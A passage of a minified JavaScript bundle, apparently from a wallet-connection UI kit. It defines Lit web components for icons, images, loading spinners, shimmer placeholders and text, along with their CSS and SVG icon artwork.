    d="M25.67 19.15a32.06 32.06 0 0 1 44.66 0l1.5 1.48c.43.42.43 1.09 0 1.5l-5.15 5.05a.31.31 0 0 1-.44 0l-2.07-2.03a23.21 23.21 0 0 0-32.34 0l-2.22 2.18a.31.31 0 0 1-.44 0l-5.15-5.05a1.05 1.05 0 0 1 0-1.5l1.65-1.63ZM81 29.6l4.6 4.5c.42.41.42 1.09 0 1.5l-20.7 20.26c-.43.43-1.14.43-1.57 0L48.63 41.47a.9.9 0 0 0-1.26 0L32.68 55.85c-.43.43-1.14.43-1.57 0L10.42 35.6a1.05 1.05 0 0 1 0-1.5l4.59-4.5a1.13 1.13 0 0 1 1.57 0l14.68 14.38a.9.9 0 0 0 1.27 0l-.35-.35.35.35L47.22 29.6a1.13 1.13 0 0 1 1.56 0l14.7 14.38a.9.9 0 0 0 1.26 0L79.42 29.6a1.13 1.13 0 0 1 1.57 0Z"
  />
</svg>`,JF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M11 6.67a1 1 0 1 0-2 0v2.66a1 1 0 0 0 2 0V6.67ZM10 14.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 1a9 9 0 1 0 0 18 9 9 0 0 0 0-18Zm-7 9a7 7 0 1 1 14 0 7 7 0 0 1-14 0Z"
    clip-rule="evenodd"
  />
</svg>`;var dv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const ZF={allWallets:XB,appStore:eF,chromeStore:hF,apple:tF,arrowBottom:rF,arrowLeft:nF,arrowRight:iF,arrowTop:sF,browser:oF,checkmark:aF,chevronBottom:cF,chevronLeft:lF,chevronRight:uF,chevronTop:fF,clock:dF,close:pF,compass:vF,coinPlaceholder:gF,copy:mF,cursor:bF,desktop:wF,disconnect:yF,discord:_F,etherscan:EF,extension:xF,externalLink:SF,facebook:CF,filters:AF,github:IF,google:RF,helpCircle:TF,infoCircle:NF,mail:OF,mobile:PF,networkPlaceholder:MF,nftPlaceholder:kF,off:DF,playStore:$F,qrCode:LF,refresh:BF,search:FF,swapHorizontal:jF,swapVertical:UF,telegram:WF,twitch:zF,twitter:HF,twitterIcon:qF,wallet:GF,walletConnect:KF,walletPlaceholder:VF,warningCircle:JF};let Ef=class extends $e{constructor(){super(...arguments),this.size="md",this.name="copy",this.color="fg-300"}render(){return this.style.cssText=`\n      --local-color: var(--wui-color-${this.color});\n      --local-width: var(--wui-icon-size-${this.size});\n    `,pe`${ZF[this.name]}`}};Ef.styles=[Rt,S3,YB],dv([ve()],Ef.prototype,"size",void 0),dv([ve()],Ef.prototype,"name",void 0),dv([ve()],Ef.prototype,"color",void 0),Ef=dv([De("wui-icon")],Ef);const QF=Qe`
  :host {
    display: block;
    width: 100%;
    height: 100%;
  }

  img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    border-radius: inherit;
  }
`;var C3=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Kd=class extends $e{constructor(){super(...arguments),this.src="./path/to/image.jpg",this.alt="Image"}render(){return pe`<img src=${this.src} alt=${this.alt} />`}};Kd.styles=[Rt,S3,QF],C3([ve()],Kd.prototype,"src",void 0),C3([ve()],Kd.prototype,"alt",void 0),Kd=C3([De("wui-image")],Kd);const YF=Qe`
  :host {
    display: block;
    width: var(--wui-box-size-lg);
    height: var(--wui-box-size-lg);
  }

  svg {
    width: var(--wui-box-size-lg);
    height: var(--wui-box-size-lg);
    fill: none;
    stroke: transparent;
    stroke-linecap: round;
    transition: all var(--wui-ease-in-power-3) var(--wui-duration-lg);
  }

  use {
    stroke: var(--wui-color-accent-100);
    stroke-width: 2px;
    stroke-dasharray: 54, 118;
    stroke-dashoffset: 172;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var XF=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let e2=class extends $e{render(){return pe`
      <svg viewBox="0 0 54 59">
        <path
          id="wui-loader-path"
          d="M17.22 5.295c3.877-2.277 5.737-3.363 7.72-3.726a11.44 11.44 0 0 1 4.12 0c1.983.363 3.844 1.45 7.72 3.726l6.065 3.562c3.876 2.276 5.731 3.372 7.032 4.938a11.896 11.896 0 0 1 2.06 3.63c.683 1.928.688 4.11.688 8.663v7.124c0 4.553-.005 6.735-.688 8.664a11.896 11.896 0 0 1-2.06 3.63c-1.3 1.565-3.156 2.66-7.032 4.937l-6.065 3.563c-3.877 2.276-5.737 3.362-7.72 3.725a11.46 11.46 0 0 1-4.12 0c-1.983-.363-3.844-1.449-7.72-3.726l-6.065-3.562c-3.876-2.276-5.731-3.372-7.032-4.938a11.885 11.885 0 0 1-2.06-3.63c-.682-1.928-.688-4.11-.688-8.663v-7.124c0-4.553.006-6.735.688-8.664a11.885 11.885 0 0 1 2.06-3.63c1.3-1.565 3.156-2.66 7.032-4.937l6.065-3.562Z"
        />
        <use xlink:href="#wui-loader-path"></use>
      </svg>
    `}};e2.styles=[Rt,YF],e2=XF([De("wui-loading-hexagon")],e2);const ej=Qe`
  :host {
    display: flex;
  }

  :host([data-size='sm']) > svg {
    width: 12px;
    height: 12px;
  }

  :host([data-size='md']) > svg {
    width: 14px;
    height: 14px;
  }

  :host([data-size='lg']) > svg {
    width: 24px;
    height: 24px;
  }

  svg {
    animation: rotate 2s linear infinite;
    transition: all var(--wui-ease-in-power-3) var(--wui-duration-lg);
  }

  circle {
    fill: none;
    stroke: var(--local-color);
    stroke-width: 4px;
    stroke-dasharray: 1, 124;
    stroke-dashoffset: 0;
    stroke-linecap: round;
    animation: dash 1.5s ease-in-out infinite;
  }

  :host([data-size='md']) > svg > circle {
    stroke-width: 6px;
  }

  :host([data-size='sm']) > svg > circle {
    stroke-width: 8px;
  }

  @keyframes rotate {
    100% {
      transform: rotate(360deg);
    }
  }

  @keyframes dash {
    0% {
      stroke-dasharray: 1, 124;
      stroke-dashoffset: 0;
    }

    50% {
      stroke-dasharray: 90, 124;
      stroke-dashoffset: -35;
    }

    100% {
      stroke-dashoffset: -125;
    }
  }
`;var A3=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Jd=class extends $e{constructor(){super(...arguments),this.color="accent-100",this.size="lg"}render(){return this.style.cssText=`--local-color: var(--wui-color-${this.color});`,this.dataset.size=this.size,pe`<svg viewBox="25 25 50 50">
      <circle r="20" cy="50" cx="50"></circle>
    </svg>`}};Jd.styles=[Rt,ej],A3([ve()],Jd.prototype,"color",void 0),A3([ve()],Jd.prototype,"size",void 0),Jd=A3([De("wui-loading-spinner")],Jd);const tj=Qe`
  :host {
    display: block;
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  svg {
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
    transition: all var(--wui-ease-in-power-3) var(--wui-duration-lg);
  }

  rect {
    fill: none;
    stroke: var(--wui-color-accent-100);
    stroke-width: 4px;
    stroke-linecap: round;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var OA=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let gg=class extends $e{constructor(){super(...arguments),this.radius=36}render(){return this.svgLoaderTemplate()}svgLoaderTemplate(){const e=this.radius>50?50:this.radius,t=36-e;return pe`
      <svg viewBox="0 0 110 110" width="110" height="110">
        <rect
          x="2"
          y="2"
          width="106"
          height="106"
          rx=${e}
          stroke-dasharray="${116+t} ${245+t}"
          stroke-dashoffset=${360+1.75*t}
        />
      </svg>
    `}};gg.styles=[Rt,tj],OA([ve({type:Number})],gg.prototype,"radius",void 0),gg=OA([De("wui-loading-thumbnail")],gg);const rj=Qe`
  :host {
    display: block;
    outline: 1px solid var(--wui-gray-glass-005);
    background: linear-gradient(
      90deg,
      var(--wui-color-bg-200) 5%,
      var(--wui-color-bg-300) 60%,
      var(--wui-color-bg-200) 100%
    );
    background-size: 250%;
    animation: shimmer 2.5s linear infinite reverse;
  }

  @keyframes shimmer {
    from {
      background-position: -250% 0;
    }
    to {
      background-position: 250% 0;
    }
  }
`;var pv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let xf=class extends $e{constructor(){super(...arguments),this.width="",this.height="",this.borderRadius="m"}render(){return this.style.cssText=`\n      width: ${this.width};\n      height: ${this.height};\n      border-radius: clamp(0px,var(--wui-border-radius-${this.borderRadius}), 40px);\n    `,pe`<slot></slot>`}};xf.styles=[rj],pv([ve()],xf.prototype,"width",void 0),pv([ve()],xf.prototype,"height",void 0),pv([ve()],xf.prototype,"borderRadius",void 0),xf=pv([De("wui-shimmer")],xf);
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */
const PA={ATTRIBUTE:1,CHILD:2,PROPERTY:3,BOOLEAN_ATTRIBUTE:4,EVENT:5,ELEMENT:6},MA=e=>(...t)=>({_$litDirective$:e,values:t});let kA=class{constructor(e){}get _$AU(){return this._$AM._$AU}_$AT(e,t,r){this._$Ct=e,this._$AM=t,this._$Ci=r}_$AS(e,t){return this.update(e,t)}update(e,t){return this.render(...t)}};
/**
 * @license
 * Copyright 2018 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const nj=MA(class extends kA{constructor(e){var t;if(super(e),e.type!==PA.ATTRIBUTE||"class"!==e.name||(null==(t=e.strings)?void 0:t.length)>2)throw Error("`classMap()` can only be used in the `class` attribute and must be the only part in the attribute.")}render(e){return" "+Object.keys(e).filter((t=>e[t])).join(" ")+" "}update(e,[t]){var r,n;if(void 0===this.it){this.it=new Set,void 0!==e.strings&&(this.st=new Set(e.strings.join(" ").split(/\s/).filter((e=>""!==e))));for(const e in t)t[e]&&(null==(r=this.st)||!r.has(e))&&this.it.add(e);return this.render(t)}const i=e.element.classList;for(const e of this.it)e in t||(i.remove(e),this.it.delete(e));for(const e in t){const r=!!t[e];r===this.it.has(e)||null!=(n=this.st)&&n.has(e)||(r?(i.add(e),this.it.add(e)):(i.remove(e),this.it.delete(e)))}return Fl}}),ij=Qe`
  :host {
    display: flex !important;
  }

  slot {
    display: inline-block;
    font-style: normal;
    font-family: var(--wui-font-family);
    font-feature-settings:
      'tnum' on,
      'lnum' on,
      'case' on;
    line-height: 130%;
    font-weight: var(--wui-font-weight-regular);
    overflow: inherit;
    text-overflow: inherit;
    text-align: var(--local-align);
    color: var(--local-color);
  }

  .wui-font-large-500,
  .wui-font-large-600,
  .wui-font-large-700 {
    font-size: var(--wui-font-size-large);
    letter-spacing: var(--wui-letter-spacing-large);
  }

  .wui-font-paragraph-500,
  .wui-font-paragraph-600,
  .wui-font-paragraph-700 {
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
  }

  .wui-font-small-400,
  .wui-font-small-500,
  .wui-font-small-600 {
    font-size: var(--wui-font-size-small);
    letter-spacing: var(--wui-letter-spacing-small);
  }

  .wui-font-tiny-500,
  .wui-font-tiny-600 {
    font-size: var(--wui-font-size-tiny);
    letter-spacing: var(--wui-letter-spacing-tiny);
  }

  .wui-font-micro-700,
  .wui-font-micro-600 {
    font-size: var(--wui-font-size-micro);
    letter-spacing: var(--wui-letter-spacing-micro);
    text-transform: uppercase;
  }

  .wui-font-small-400 {
    font-weight: var(--wui-font-weight-light);
  }

  .wui-font-large-700,
  .wui-font-paragraph-700,
  .wui-font-micro-700 {
    font-weight: var(--wui-font-weight-bold);
  }

  .wui-font-large-600,
  .wui-font-paragraph-600,
  .wui-font-small-600,
  .wui-font-tiny-600,
  .wui-font-micro-600 {
    font-weight: var(--wui-font-weight-medium);
  }
`;var gv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Sf=class extends $e{constructor(){super(...arguments),this.variant="paragraph-500",this.color="fg-300",this.align="left"}render(){const e={[`wui-font-${this.variant}`]:!0,[`wui-color-${this.color}`]:!0};return this.style.cssText=`\n      --local-align: ${this.align};\n      --local-color: var(--wui-color-${this.color});\n    `,pe`<slot class=${nj(e)}></slot>`}};Sf.styles=[Rt,ij],gv([ve()],Sf.prototype,"variant",void 0),gv([ve()],Sf.prototype,"color",void 0),gv([ve()],Sf.prototype,"align",void 0),Sf=gv([De("wui-text")],Sf);const sj=ze`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="30" />
  <circle cx="30" cy="30" r="3" fill="#fff" />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m45.32 17.9-.88-.42.88.42.02-.05c.1-.2.21-.44.26-.7l-.82-.15.82.16a2 2 0 0 0-.24-1.4c-.13-.23-.32-.42-.47-.57a8.42 8.42 0 0 1-.04-.04l-.04-.04a2.9 2.9 0 0 0-.56-.47l-.51.86.5-.86a2 2 0 0 0-1.4-.24c-.26.05-.5.16-.69.26l-.05.02-15.05 7.25-.1.05c-1.14.55-1.85.89-2.46 1.37a7 7 0 0 0-1.13 1.14c-.5.6-.83 1.32-1.38 2.45l-.05.11-7.25 15.05-.02.05c-.1.2-.21.43-.26.69a2 2 0 0 0 .24 1.4l.85-.5-.85.5c.13.23.32.42.47.57l.04.04.04.04c.15.15.34.34.56.47a2 2 0 0 0 1.41.24l-.2-.98.2.98c.25-.05.5-.17.69-.26l.05-.02-.42-.87.42.87 15.05-7.25.1-.05c1.14-.55 1.85-.89 2.46-1.38a7 7 0 0 0 1.13-1.13 12.87 12.87 0 0 0 1.43-2.56l7.25-15.05Z"
  />
  <path
    fill="#1DC956"
    d="M33.38 32.72 30.7 29.3 15.86 44.14l.2.2a1 1 0 0 0 1.14.2l15.1-7.27a3 3 0 0 0 1.08-4.55Z"
  />
  <path
    fill="#86F999"
    d="m26.62 27.28 2.67 3.43 14.85-14.85-.2-.2a1 1 0 0 0-1.14-.2l-15.1 7.27a3 3 0 0 0-1.08 4.55Z"
  />
  <circle cx="30" cy="30" r="3" fill="#fff" transform="rotate(45 30 30)" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
</svg> `,oj=ze`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#clip0_7734_50402)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#EB8B47"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M19 52C24.5228 52 29 47.5228 29 42C29 36.4772 24.5228 32 19 32C13.4772 32 9 36.4772 9 42C9 47.5228 13.4772 52 19 52Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.8437 8.3264C42.4507 7.70891 41.5493 7.70891 41.1564 8.32641L28.978 27.4638C28.5544 28.1295 29.0326 29.0007 29.8217 29.0007H54.1783C54.9674 29.0007 55.4456 28.1295 55.022 27.4638L42.8437 8.3264Z"
      fill="white"
    />
    <path
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M42.3348 11.6456C42.659 11.7608 42.9061 12.1492 43.4005 12.926L50.7332 24.4488C51.2952 25.332 51.5763 25.7737 51.5254 26.1382C51.4915 26.3808 51.3698 26.6026 51.1833 26.7614C50.9031 27 50.3796 27 49.3327 27H34.6673C33.6204 27 33.0969 27 32.8167 26.7614C32.6302 26.6026 32.5085 26.3808 32.4746 26.1382C32.4237 25.7737 32.7048 25.332 33.2669 24.4488L40.5995 12.926C41.0939 12.1492 41.341 11.7608 41.6652 11.6456C41.8818 11.5687 42.1182 11.5687 42.3348 11.6456ZM35.0001 26.999C38.8661 26.999 42.0001 23.865 42.0001 19.999C42.0001 23.865 45.1341 26.999 49.0001 26.999H35.0001Z"
      fill="#FF974C"
    />
    <path
      d="M10.1061 9.35712C9.9973 9.67775 9.99867 10.0388 9.99978 10.3323C9.99989 10.3611 10 10.3893 10 10.4167V25.5833C10 25.6107 9.99989 25.6389 9.99978 25.6677C9.99867 25.9612 9.9973 26.3222 10.1061 26.6429C10.306 27.2317 10.7683 27.694 11.3571 27.8939C11.6777 28.0027 12.0388 28.0013 12.3323 28.0002C12.3611 28.0001 12.3893 28 12.4167 28H19C24.5228 28 29 23.5228 29 18C29 12.4772 24.5228 8 19 8H12.4167C12.3893 8 12.3611 7.99989 12.3323 7.99978C12.0388 7.99867 11.6778 7.9973 11.3571 8.10614C10.7683 8.306 10.306 8.76834 10.1061 9.35712Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="19" cy="18" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
    <circle cx="19" cy="42" r="4" fill="#EB8B47" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="clip0_7734_50402">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,aj=ze`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#1DC956"
      d="M0 25.01c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02.11 15.65.11 24.9.11h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.13 60 15.76 60 25v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-3.45 1.97-8.08 1.97-17.33 1.97H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 49.1 0 44.46 0 35.21v-10.2Z"
    />
    <path
      fill="#2BEE6C"
      d="M16.1 60c-3.82-.18-6.4-.64-8.53-1.86a15 15 0 0 1-5.6-5.6C.55 50.06.16 46.97.04 41.98L4.2 40.6a4 4 0 0 0 2.48-2.39l4.65-12.4a2 2 0 0 1 2.5-1.2l2.53.84a2 2 0 0 0 2.43-1l2.96-5.94a2 2 0 0 1 3.7.32l3.78 12.58a2 2 0 0 0 3.03 1.09l3.34-2.23a2 2 0 0 0 .65-.7l5.3-9.72a2 2 0 0 1 1.42-1.01l4.14-.69a2 2 0 0 1 1.6.44l3.9 3.24a2 2 0 0 0 2.7-.12l4.62-4.63c.08 2.2.08 4.8.08 7.93v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6c-2.13 1.22-4.7 1.68-8.54 1.86H16.11Z"
    />
    <path
      fill="#fff"
      d="m.07 43.03-.05-2.1 3.85-1.28a3 3 0 0 0 1.86-1.79l4.66-12.4a3 3 0 0 1 3.75-1.8l2.53.84a1 1 0 0 0 1.21-.5l2.97-5.94a3 3 0 0 1 5.56.48l3.77 12.58a1 1 0 0 0 1.51.55l3.34-2.23a1 1 0 0 0 .33-.35l5.3-9.71a3 3 0 0 1 2.14-1.53l4.13-.69a3 3 0 0 1 2.41.66l3.9 3.24a1 1 0 0 0 1.34-.06l5.28-5.28c.05.85.08 1.75.1 2.73L56 22.41a3 3 0 0 1-4.04.19l-3.9-3.25a1 1 0 0 0-.8-.21l-4.13.69a1 1 0 0 0-.72.5l-5.3 9.72a3 3 0 0 1-.97 1.05l-3.34 2.23a3 3 0 0 1-4.53-1.63l-3.78-12.58a1 1 0 0 0-1.85-.16l-2.97 5.94a3 3 0 0 1-3.63 1.5l-2.53-.84a1 1 0 0 0-1.25.6l-4.65 12.4a5 5 0 0 1-3.1 3L.07 43.02Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M49.5 19a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M45 .28v59.66l-2 .1V.19c.7.02 1.37.05 2 .1Z" />
    <path fill="#2BEE6C" d="M47.5 19a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
    <path
      stroke="#fff"
      stroke-opacity=".1"
      d="M.5 25.01c0-4.63 0-8.08.24-10.8.25-2.7.73-4.64 1.66-6.28a14.5 14.5 0 0 1 5.42-5.41C9.46 1.58 11.39 1.1 14.1.85A133 133 0 0 1 24.9.61h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.67a14.5 14.5 0 0 1 5.42 5.4c.93 1.65 1.41 3.58 1.66 6.3.24 2.71.24 6.16.24 10.79v10.2c0 4.64 0 8.08-.24 10.8-.25 2.7-.73 4.65-1.66 6.28a14.5 14.5 0 0 1-5.42 5.42c-1.63.93-3.57 1.41-6.28 1.66-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.66a14.5 14.5 0 0 1-5.42-5.42C1.47 50.66 1 48.72.74 46.01A133 133 0 0 1 .5 35.2v-10.2Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg>`,cj=ze`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="30" />
    <path
      fill="#E87DE8"
      d="M57.98.01v19.5a4.09 4.09 0 0 0-2.63 2.29L50.7 34.2a2 2 0 0 1-2.5 1.2l-2.53-.84a2 2 0 0 0-2.42 1l-2.97 5.94a2 2 0 0 1-3.7-.32L32.8 28.6a2 2 0 0 0-3.02-1.09l-3.35 2.23a2 2 0 0 0-.64.7l-5.3 9.72a2 2 0 0 1-1.43 1.01l-4.13.69a2 2 0 0 1-1.61-.44l-3.9-3.24a2 2 0 0 0-2.69.12L2.1 42.93.02 43V.01h57.96Z"
    />
    <path
      fill="#fff"
      d="m61.95 16.94.05 2.1-3.85 1.28a3 3 0 0 0-1.86 1.79l-4.65 12.4a3 3 0 0 1-3.76 1.8l-2.53-.84a1 1 0 0 0-1.2.5l-2.98 5.94a3 3 0 0 1-5.55-.48l-3.78-12.58a1 1 0 0 0-1.5-.55l-3.35 2.23a1 1 0 0 0-.32.35l-5.3 9.72a3 3 0 0 1-2.14 1.52l-4.14.69a3 3 0 0 1-2.41-.66l-3.9-3.24a1 1 0 0 0-1.34.06l-5.28 5.28c-.05-.84-.08-1.75-.1-2.73l3.97-3.96a3 3 0 0 1 4.04-.19l3.89 3.25a1 1 0 0 0 .8.21l4.14-.68a1 1 0 0 0 .71-.51l5.3-9.71a3 3 0 0 1 .97-1.06l3.34-2.23a3 3 0 0 1 4.54 1.63l3.77 12.58a1 1 0 0 0 1.86.16l2.96-5.93a3 3 0 0 1 3.64-1.5l2.52.83a1 1 0 0 0 1.25-.6l4.66-12.4a5 5 0 0 1 3.1-2.99l4.43-1.48Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M35.5 27a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0Z"
      clip-rule="evenodd"
    />
    <path fill="#fff" d="M31 0v60h-2V0h2Z" />
    <path fill="#E87DE8" d="M33.5 27a3.5 3.5 0 1 1-7 0 3.5 3.5 0 0 1 7 0Z" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,lj=ze`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#987DE8" rx="30" />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="m15.48 28.37 11.97-19.3a3 3 0 0 1 5.1 0l11.97 19.3a6 6 0 0 1 .9 3.14v.03a6 6 0 0 1-1.16 3.56L33.23 50.2a4 4 0 0 1-6.46 0L15.73 35.1a6 6 0 0 1-1.15-3.54v-.03a6 6 0 0 1 .9-3.16Z"
      clip-rule="evenodd"
    />
    <path
      fill="#643CDD"
      d="M30.84 10.11a1 1 0 0 0-.84-.46V24.5l12.6 5.53a2 2 0 0 0-.28-1.4L30.84 10.11Z"
    />
    <path
      fill="#BDADEB"
      d="M30 9.65a1 1 0 0 0-.85.46L17.66 28.64a2 2 0 0 0-.26 1.39L30 24.5V9.65Z"
    />
    <path
      fill="#643CDD"
      d="M30 50.54a1 1 0 0 0 .8-.4l11.24-15.38c.3-.44-.2-1-.66-.73l-9.89 5.68a3 3 0 0 1-1.5.4v10.43Z"
    />
    <path
      fill="#BDADEB"
      d="m17.97 34.76 11.22 15.37c.2.28.5.41.8.41V40.11a3 3 0 0 1-1.49-.4l-9.88-5.68c-.47-.27-.97.3-.65.73Z"
    />
    <path
      fill="#401AB3"
      d="M42.6 30.03 30 24.5v13.14a3 3 0 0 0 1.5-.4l10.14-5.83a2 2 0 0 0 .95-1.38Z"
    />
    <path
      fill="#7C5AE2"
      d="M30 37.64V24.46l-12.6 5.57a2 2 0 0 0 .97 1.39l10.13 5.82a3 3 0 0 0 1.5.4Z"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg> `,uj=ze`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="3" />
  <path
    fill="#1FAD7E"
    stroke="#fff"
    stroke-width="2"
